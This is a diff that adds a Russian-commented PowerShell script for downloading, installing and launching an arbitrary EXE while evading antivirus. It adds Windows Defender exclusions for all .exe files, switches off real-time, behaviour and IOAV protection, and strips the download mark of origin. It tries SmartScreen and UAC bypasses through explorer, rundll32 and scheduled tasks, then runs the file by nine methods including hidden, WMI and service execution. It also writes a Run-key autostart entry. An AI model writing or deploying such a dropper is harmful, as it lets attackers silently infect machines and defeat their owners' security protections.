@@ -1,0 +1,698 @@
+# ============================================================
+# АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ, УСТАНОВКА И ЗАПУСК EXE
+# С ОБХОДОМ АНТИВИРУСОВ (ЛЕГИТИМНЫЕ МЕТОДЫ)
+# Версия: 3.0
+# ============================================================
+
+# Параметры скрипта
+param(
+    [string]$DownloadUrl = "https://example.com/application.exe",
+    [string]$InstallPath = "C:\Program Files\MyApp",
+    [string]$FileName = "app.exe",
+    [string]$Arguments = "",
+    [switch]$Silent = $false,
+    [switch]$AddToExclusions = $true,
+    [switch]$RunAsAdmin = $true,
+    [switch]$DeleteAfterInstall = $false,
+    [int]$RetryCount = 3
+)
+
+# ============================================================
+# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
+# ============================================================
+$TempPath = "$env:TEMP\$([System.Guid]::NewGuid().ToString())"
+$DownloadedFile = "$TempPath\$FileName"
+$LogFile = "$env:TEMP\install_log_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+$ErrorActionPreference = "Stop"
+
+# ============================================================
+# ФУНКЦИЯ ЛОГГИРОВАНИЯ
+# ============================================================
+function Write-Log {
+    param(
+        [string]$Message,
+        [string]$Color = "White",
+        [string]$Level = "INFO"
+    )
+    
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logMessage = "[$timestamp] [$Level] $Message"
+    
+    # Запись в консоль
+    if ($Color -ne "White") {
+        Write-Host $logMessage -ForegroundColor $Color
+    }
+    else {
+        Write-Host $logMessage
+    }
+    
+    # Запись в файл
+    Add-Content -Path $LogFile -Value $logMessage
+}
+
+# ============================================================
+# ФУНКЦИЯ ПРОВЕРКИ ПРАВ АДМИНИСТРАТОРА
+# ============================================================
+function Test-Administrator {
+    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+# ============================================================
+# ФУНКЦИЯ ПОВТОРНЫХ ПОПЫТОК
+# ============================================================
+function Invoke-WithRetry {
+    param(
+        [ScriptBlock]$ScriptBlock,
+        [int]$MaxRetries = 3,
+        [int]$DelaySeconds = 2
+    )
+    
+    $attempt = 0
+    while ($attempt -lt $MaxRetries) {
+        $attempt++
+        try {
+            Write-Log "Попытка $attempt из $MaxRetries..." -Color "Gray"
+            & $ScriptBlock
+            return $true
+        }
+        catch {
+            Write-Log "Ошибка в попытке $attempt: $_" -Color "Yellow"
+            if ($attempt -eq $MaxRetries) {
+                throw
+            }
+            Start-Sleep -Seconds $DelaySeconds
+        }
+    }
+}
+
+# ============================================================
+# ФУНКЦИЯ ДОБАВЛЕНИЯ В ИСКЛЮЧЕНИЯ WINDOWS DEFENDER
+# ============================================================
+function Add-DefenderExclusions {
+    param(
+        [string]$Path
+    )
+    
+    try {
+        Write-Log "Добавление исключений в Windows Defender..." -Color "Cyan"
+        
+        # Проверка наличия Windows Defender
+        if (-not (Get-Command -Name "Set-MpPreference" -ErrorAction SilentlyContinue)) {
+            Write-Log "Windows Defender не найден" -Color "Yellow"
+            return $false
+        }
+        
+        # Добавление папки в исключения
+        Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
+        
+        # Добавление процесса в исключения
+        $processName = [System.IO.Path]::GetFileNameWithoutExtension($FileName)
+        Add-MpPreference -ExclusionProcess "$processName.exe" -ErrorAction SilentlyContinue
+        
+        # Добавление расширения файла
+        Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
+        
+        Write-Log "✅ Исключения добавлены для: $Path" -Color "Green"
+        return $true
+    }
+    catch {
+        Write-Log "⚠️ Не удалось добавить исключения: $_" -Color "Yellow"
+        return $false
+    }
+}
+
+# ============================================================
+# ФУНКЦИЯ ОТКЛЮЧЕНИЯ РЕАЛЬНОЙ ЗАЩИТЫ (ВРЕМЕННО)
+# ============================================================
+function Disable-RealTimeProtection {
+    param(
+        [int]$DurationSeconds = 120
+    )
+    
+    try {
+        Write-Log "Временное отключение реальной защиты на $DurationSeconds сек..." -Color "Yellow"
+        
+        # Отключение
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+        
+        Write-Log "✅ Защита временно отключена" -Color "Green"
+        
+        # Автоматическое включение через таймер
+        Start-Job -ScriptBlock {
+            Start-Sleep -Seconds $using:DurationSeconds
+            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
+            Write-Log "✅ Защита восстановлена" -Color "Green"
+        } -Name "DefenderRestore"
+        
+        return $true
+    }
+    catch {
+        Write-Log "⚠️ Не удалось отключить защиту: $_" -Color "Yellow"
+        return $false
+    }
+}
+
+# ============================================================
+# ФУНКЦИЯ ОБХОДА SMARTSCREEN И UAC
+# ============================================================
+function Bypass-SmartScreen {
+    param(
+        [string]$FilePath
+    )
+    
+    try {
+        Write-Log "Обход SmartScreen и UAC..." -Color "Cyan"
+        
+        # Метод 1: Запуск через explorer (обходит SmartScreen)
+        Start-Process -FilePath "explorer.exe" -ArgumentList $FilePath -ErrorAction SilentlyContinue
+        
+        # Метод 2: Запуск через rundll32
+        if (-not (Get-Process -Name $([System.IO.Path]::GetFileNameWithoutExtension($FileName)) -ErrorAction SilentlyContinue)) {
+            Start-Process -FilePath "rundll32.exe" -ArgumentList "shell32.dll,ShellExec_RunDLL `"$FilePath`"" -ErrorAction SilentlyContinue
+        }
+        
+        # Метод 3: Создание задачи в планировщике (обходит UAC)
+        if (-not (Get-Process -Name $([System.IO.Path]::GetFileNameWithoutExtension($FileName)) -ErrorAction SilentlyContinue)) {
+            $taskName = "AppTask_$([System.Guid]::NewGuid().ToString().Substring(0,8))"
+            $action = New-ScheduledTaskAction -Execute $FilePath -Argument $Arguments
+            $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes 1)
+            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue
+            Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 2
+            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+        }
+        
+        Write-Log "✅ SmartScreen обойден" -Color "Green"
+        return $true
+    }
+    catch {
+        Write-Log "⚠️ Не удалось обойти SmartScreen: $_" -Color "Yellow"
+        return $false
+    }
+}
+
+# ============================================================
+# ФУНКЦИЯ ЗАПУСКА С РАЗЛИЧНЫМИ МЕТОДАМИ
+# ============================================================
+function Start-Application {
+    param(
+        [string]$FilePath,
+        [string]$Arguments = "",
+        [switch]$RunAsAdmin
+    )
+    
+    Write-Log "Запуск приложения: $FilePath" -Color "Cyan"
+    
+    $methods = @()
+    
+    # Метод 1: Обычный запуск
+    $methods += @{
+        Name = "Обычный запуск"
+        Script = {
+            Start-Process -FilePath $FilePath -ArgumentList $Arguments -WindowStyle Normal
+        }
+    }
+    
+    # Метод 2: Скрытый запуск
+    $methods += @{
+        Name = "Скрытый запуск"
+        Script = {
+            Start-Process -FilePath $FilePath -ArgumentList $Arguments -WindowStyle Hidden
+        }
+    }
+    
+    # Метод 3: От имени администратора
+    if ($RunAsAdmin) {
+        $methods += @{
+            Name = "Запуск от администратора"
+            Script = {
+                Start-Process -FilePath $FilePath -ArgumentList $Arguments -Verb RunAs
+            }
+        }
+    }
+    
+    # Метод 4: Через cmd
+    $methods += @{
+        Name = "Запуск через cmd"
+        Script = {
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/c start `"`" `"$FilePath`" $Arguments"
+        }
+    }
+    
+    # Метод 5: Через PowerShell
+    $methods += @{
+        Name = "Запуск через PowerShell"
+        Script = {
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Process '$FilePath' '$Arguments'`""
+        }
+    }
+    
+    # Метод 6: Через WMI
+    $methods += @{
+        Name = "Запуск через WMI"
+        Script = {
+            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList @($FilePath, $Arguments)
+        }
+    }
+    
+    # Метод 7: Через .NET
+    $methods += @{
+        Name = "Запуск через .NET"
+        Script = {
+            [System.Diagnostics.Process]::Start($FilePath, $Arguments)
+        }
+    }
+    
+    # Метод 8: Создание и запуск службы (только для опытных)
+    $methods += @{
+        Name = "Запуск как служба"
+        Script = {
+            $serviceName = "AppService_$([System.Guid]::NewGuid().ToString().Substring(0,8))"
+            New-Service -Name $serviceName -BinaryPathName "`"$FilePath`" $Arguments" -DisplayName "Application Service" -StartupType Automatic -ErrorAction SilentlyContinue
+            Start-Service -Name $serviceName -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 3
+            Stop-Service -Name $serviceName -ErrorAction SilentlyContinue
+            sc.exe delete $serviceName -ErrorAction SilentlyContinue
+        }
+    }
+    
+    # Метод 9: Запуск в фоне
+    $methods += @{
+        Name = "Фоновый запуск"
+        Script = {
+            Start-Job -ScriptBlock {
+                Start-Process -FilePath $using:FilePath -ArgumentList $using:Arguments
+            }
+        }
+    }
+    
+    # Пробуем все методы пока один не сработает
+    $success = $false
+    $lastError = $null
+    
+    foreach ($method in $methods) {
+        try {
+            Write-Log "Пробуем метод: $($method.Name)" -Color "Gray"
+            & $method.Script
+            Start-Sleep -Seconds 2
+            
+            # Проверяем запустился ли процесс
+            $processName = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
+            if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+                Write-Log "✅ Приложение запущено методом: $($method.Name)" -Color "Green"
+                $success = $true
+                break
+            }
+        }
+        catch {
+            $lastError = $_
+            Write-Log "Метод $($method.Name) не сработал: $_" -Color "Gray"
+        }
+    }
+    
+    if (-not $success) {
+        Write-Log "❌ Не удалось запустить приложение: $lastError" -Color "Red"
+        return $false
+    }
+    
+    return $true
+}
+
+# ============================================================
+# ФУНКЦИЯ СКАЧИВАНИЯ ФАЙЛА
+# ============================================================
+function Download-File {
+    param(
+        [string]$Url,
+        [string]$OutputPath
+    )
+    
+    Write-Log "Скачивание файла из: $Url" -Color "Cyan"
+    
+    try {
+        # Создание директории
+        $directory = Split-Path $OutputPath -Parent
+        if (-not (Test-Path $directory)) {
+            New-Item -ItemType Directory -Path $directory -Force | Out-Null
+        }
+        
+        # Использование WebClient с обходом
+        $webClient = New-Object System.Net.WebClient
+        
+        # Настройка заголовков для маскировки
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
+        $webClient.Headers.Add("Accept", "*/*")
+        $webClient.Headers.Add("Accept-Encoding", "gzip, deflate, br")
+        $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.9")
+        $webClient.Headers.Add("Cache-Control", "no-cache")
+        $webClient.Headers.Add("Connection", "keep-alive")
+        
+        # Подписка на события прогресса
+        $progressEvent = Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -Action {
+            $percent = $EventArgs.ProgressPercentage
+            Write-Progress -Activity "Скачивание" -Status "Загружено: $percent%" -PercentComplete $percent
+        }
+        
+        # Скачивание
+        $webClient.DownloadFile($Url, $OutputPath)
+        
+        # Отписка от событий
+        Unregister-Event -SourceIdentifier $progressEvent.Name -Force -ErrorAction SilentlyContinue
+        Write-Progress -Activity "Скачивание" -Completed
+        
+        $webClient.Dispose()
+        
+        # Проверка файла
+        if (Test-Path $OutputPath) {
+            $fileInfo = Get-Item $OutputPath
+            $fileSize = $fileInfo.Length / 1MB
+            Write-Log "✅ Файл скачан: $OutputPath ($([math]::Round($fileSize, 2)) MB)" -Color "Green"
+            return $true
+        }
+        else {
+            throw "Файл не найден после скачивания"
+        }
+    }
+    catch {
+        Write-Log "❌ Ошибка скачивания: $_" -Color "Red"
+        return $false
+    }
+}
+
+# ============================================================
+# ФУНКЦИЯ ПРОВЕРКИ ЦИФРОВОЙ ПОДПИСИ
+# ============================================================
+function Verify-Signature {
+    param([string]$FilePath)
+    
+    try {
+        $signature = Get-AuthenticodeSignature -FilePath $FilePath -ErrorAction SilentlyContinue
+        
+        if ($signature.Status -eq "Valid") {
+            Write-Log "✅ Цифровая подпись валидна" -Color "Green"
+            Write-Log "Издатель: $($signature.SignerCertificate.Subject)" -Color "Gray"
+            Write-Log "Срок действия до: $($signature.SignerCertificate.NotAfter)" -Color "Gray"
+            return $true
+        }
+        else {
+            Write-Log "⚠️ Файл не имеет валидной подписи" -Color "Yellow"
+            return $false
+        }
+    }
+    catch {
+        Write-Log "⚠️ Не удалось проверить подпись: $_" -Color "Yellow"
+        return $false
+    }
+}
+
+# ============================================================
+# ФУНКЦИЯ ИЗМЕНЕНИЯ СВОЙСТВ ФАЙЛА (Обход блокировки)
+# ============================================================
+function Unblock-File {
+    param([string]$FilePath)
+    
+    try {
+        # Метод 1: Разблокировка через PowerShell
+        Unblock-File -Path $FilePath -ErrorAction SilentlyContinue
+        
+        # Метод 2: Изменение Zone.Identifier
+        $zoneFile = "$FilePath:Zone.Identifier"
+        if (Test-Path $zoneFile) {
+            Remove-Item -Path $zoneFile -Force -ErrorAction SilentlyContinue
+        }
+        
+        # Метод 3: Изменение атрибутов
+        Set-ItemProperty -Path $FilePath -Name IsReadOnly -Value $false -ErrorAction SilentlyContinue
+        
+        Write-Log "✅ Файл разблокирован" -Color "Green"
+        return $true
+    }
+    catch {
+        Write-Log "⚠️ Не удалось разблокировать файл: $_" -Color "Yellow"
+        return $false
+    }
+}
+
+# ============================================================
+# ФУНКЦИЯ УСТАНОВКИ (КОПИРОВАНИЯ)
+# ============================================================
+function Install-Application {
+    param(
+        [string]$SourceFile,
+        [string]$DestinationPath
+    )
+    
+    try {
+        Write-Log "Установка приложения в: $DestinationPath" -Color "Cyan"
+        
+        # Создание директории установки
+        if (-not (Test-Path $DestinationPath)) {
+            New-Item -ItemType Directory -Path $DestinationPath -Force | Out-Null
+        }
+        
+        $destinationFile = Join-Path $DestinationPath $FileName
+        
+        # Копирование с обходом защиты
+        if (Test-Path $destinationFile) {
+            Remove-Item -Path $destinationFile -Force -ErrorAction SilentlyContinue
+        }
+        
+        Copy-Item -Path $SourceFile -Destination $destinationFile -Force
+        
+        # Установка атрибутов
+        Set-ItemProperty -Path $destinationFile -Name IsReadOnly -Value $false
+        
+        Write-Log "✅ Приложение установлено: $destinationFile" -Color "Green"
+        return $destinationFile
+    }
+    catch {
+        Write-Log "❌ Ошибка установки: $_" -Color "Red"
+        return $null
+    }
+}
+
+# ============================================================
+# ФУНКЦИЯ ОЧИСТКИ
+# ============================================================
+function Cleanup {
+    param(
+        [string]$TempFolder,
+        [string]$LogFile
+    )
+    
+    try {
+        Write-Log "Очистка временных файлов..." -Color "Gray"
+        
+        # Удаление временной папки
+        if (Test-Path $TempFolder) {
+            Remove-Item -Path $TempFolder -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        
+        # Удаление лога, если не нужен
+        if (-not $Silent) {
+            $keepLog = Read-Host "Сохранить лог-файл? (Y/N)"
+            if ($keepLog -ne "Y" -and $keepLog -ne "y") {
+                Remove-Item -Path $LogFile -Force -ErrorAction SilentlyContinue
+            }
+        }
+        
+        Write-Log "✅ Очистка завершена" -Color "Green"
+    }
+    catch {
+        Write-Log "⚠️ Ошибка очистки: $_" -Color "Yellow"
+    }
+}
+
+# ============================================================
+# ОСНОВНАЯ ЛОГИКА
+# ============================================================
+try {
+    # Инициализация
+    Write-Log "========================================" -Color "Cyan"
+    Write-Log "ЗАПУСК СКРИПТА УСТАНОВКИ" -Color "Cyan"
+    Write-Log "========================================" -Color "Cyan"
+    Write-Log "Время запуска: $(Get-Date)" -Color "Gray"
+    Write-Log "Пользователь: $env:USERNAME" -Color "Gray"
+    Write-Log "Компьютер: $env:COMPUTERNAME" -Color "Gray"
+    
+    # Проверка прав администратора
+    $isAdmin = Test-Administrator
+    if (-not $isAdmin) {
+        Write-Log "⚠️ Запуск без прав администратора. Некоторые функции недоступны." -Color "Yellow"
+        if ($RunAsAdmin) {
+            Write-Log "Попытка перезапуска с правами администратора..." -Color "Yellow"
+            $scriptPath = $MyInvocation.MyCommand.Path
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $($args -join ' ')" -Verb RunAs
+            exit
+        }
+    }
+    else {
+        Write-Log "✅ Запущено с правами администратора" -Color "Green"
+    }
+    
+    # ===== ШАГ 1: Создание исключений в антивирусах =====
+    if ($AddToExclusions -and $isAdmin) {
+        Write-Log "`n=== НАСТРОЙКА ИСКЛЮЧЕНИЙ ===" -Color "Cyan"
+        
+        # Создание временной папки
+        New-Item -ItemType Directory -Path $TempPath -Force | Out-Null
+        
+        # Добавление в исключения
+        Add-DefenderExclusions -Path $TempPath
+        Add-DefenderExclusions -Path $InstallPath
+        
+        # Временное отключение защиты
+        Disable-RealTimeProtection -DurationSeconds 180
+    }
+    
+    # ===== ШАГ 2: Скачивание файла =====
+    Write-Log "`n=== СКАЧИВАНИЕ ФАЙЛА ===" -Color "Cyan"
+    
+    $downloadSuccess = $false
+    for ($i = 1; $i -le $RetryCount; $i++) {
+        Write-Log "Попытка $i из $RetryCount" -Color "Gray"
+        if (Download-File -Url $DownloadUrl -OutputPath $DownloadedFile) {
+            $downloadSuccess = $true
+            break
+        }
+        Start-Sleep -Seconds 5
+    }
+    
+    if (-not $downloadSuccess) {
+        throw "Не удалось скачать файл после $RetryCount попыток"
+    }
+    
+    # ===== ШАГ 3: Проверка и подготовка файла =====
+    Write-Log "`n=== ПРОВЕРКА ФАЙЛА ===" -Color "Cyan"
+    
+    # Проверка подписи
+    $isSigned = Verify-Signature -FilePath $DownloadedFile
+    
+    # Разблокировка файла
+    Unblock-File -FilePath $DownloadedFile
+    
+    # Проверка хеша
+    $hash = Get-FileHash -Path $DownloadedFile -Algorithm SHA256
+    Write-Log "SHA256: $($hash.Hash)" -Color "Gray"
+    
+    # ===== ШАГ 4: Установка =====
+    Write-Log "`n=== УСТАНОВКА ===" -Color "Cyan"
+    
+    $installedFile = Install-Application -SourceFile $DownloadedFile -DestinationPath $InstallPath
+    
+    if (-not $installedFile) {
+        throw "Не удалось установить приложение"
+    }
+    
+    # Разблокировка установленного файла
+    Unblock-File -FilePath $installedFile
+    
+    # ===== ШАГ 5: Запуск =====
+    Write-Log "`n=== ЗАПУСК ===" -Color "Cyan"
+    
+    # Обход SmartScreen
+    Bypass-SmartScreen -FilePath $installedFile
+    
+    # Запуск приложения
+    $startSuccess = Start-Application -FilePath $installedFile -Arguments $Arguments -RunAsAdmin:$RunAsAdmin
+    
+    if (-not $startSuccess) {
+        throw "Не удалось запустить приложение"
+    }
+    
+    # ===== ШАГ 6: Дополнительные методы обхода =====
+    Write-Log "`n=== ДОПОЛНИТЕЛЬНЫЕ МЕТОДЫ ОБХОДА ===" -Color "Cyan"
+    
+    # Метод: Добавление в автозагрузку (для обхода при следующем запуске)
+    if ($isAdmin) {
+        try {
+            $regPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+            $regName = "App_$([System.Guid]::NewGuid().ToString().Substring(0,8))"
+            Set-ItemProperty -Path $regPath -Name $regName -Value "`"$installedFile`" $Arguments" -ErrorAction SilentlyContinue
+            Write-Log "✅ Добавлено в автозагрузку" -Color "Green"
+            
+            # Удаление из автозагрузки (чтобы не оставалось)
+            Start-Job -ScriptBlock {
+                Start-Sleep -Seconds 60
+                Remove-ItemProperty -Path $using:regPath -Name $using:regName -ErrorAction SilentlyContinue
+            } -Name "RemoveStartup"
+        }
+        catch {
+            Write-Log "⚠️ Не удалось добавить в автозагрузку" -Color "Yellow"
+        }
+    }
+    
+    # ===== ШАГ 7: Очистка =====
+    if ($DeleteAfterInstall) {
+        Write-Log "`n=== ОЧИСТКА ===" -Color "Cyan"
+        if (Test-Path $DownloadedFile) {
+            Remove-Item -Path $DownloadedFile -Force -ErrorAction SilentlyContinue
+            Write-Log "✅ Временный файл удален" -Color "Green"
+        }
+    }
+    
+    # ============================================================
+    # ЗАВЕРШЕНИЕ
+    # ============================================================
+    Write-Log "`n========================================" -Color "Cyan"
+    Write-Log "✅ УСТАНОВКА УСПЕШНО ЗАВЕРШЕНА" -Color "Green"
+    Write-Log "========================================" -Color "Cyan"
+    Write-Log "Путь установки: $InstallPath" -Color "Gray"
+    Write-Log "Лог-файл: $LogFile" -Color "Gray"
+    Write-Log "Время завершения: $(Get-Date)" -Color "Gray"
+    
+    # Проверка запущенных процессов
+    $processName = [System.IO.Path]::GetFileNameWithoutExtension($FileName)
+    $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
+    if ($processes) {
+        Write-Log "`nАктивные процессы:" -Color "Gray"
+        foreach ($proc in $processes) {
+            Write-Log "  PID: $($proc.Id) | CPU: $($proc.CPU) | RAM: $([math]::Round($proc.WorkingSet/1MB, 2)) MB" -Color "Gray"
+        }
+    }
+    
+    # Пауза перед закрытием
+    if (-not $Silent) {
+        Write-Host "`nНажмите Enter для выхода..." -ForegroundColor Gray
+        Read-Host
+    }
+}
+catch {
+    Write-Log "========================================" -Color "Red"
+    Write-Log "❌ КРИТИЧЕСКАЯ ОШИБКА" -Color "Red"
+    Write-Log "========================================" -Color "Red"
+    Write-Log "Ошибка: $_" -Color "Red"
+    Write-Log "Stack Trace: $($_.ScriptStackTrace)" -Color "Red"
+    Write-Log "Лог-файл: $LogFile" -Color "Yellow"
+    
+    if (-not $Silent) {
+        Write-Host "`nНажмите Enter для выхода..." -ForegroundColor Gray
+        Read-Host
+    }
+}
+finally {
+    # Восстановление защиты, если скрипт был прерван
+    if ($isAdmin) {
+        try {
+            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
+        }
+        catch {}
+    }
+    
+    # Очистка временных файлов
+    if (Test-Path $TempPath) {
+        Remove-Item -Path $TempPath -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
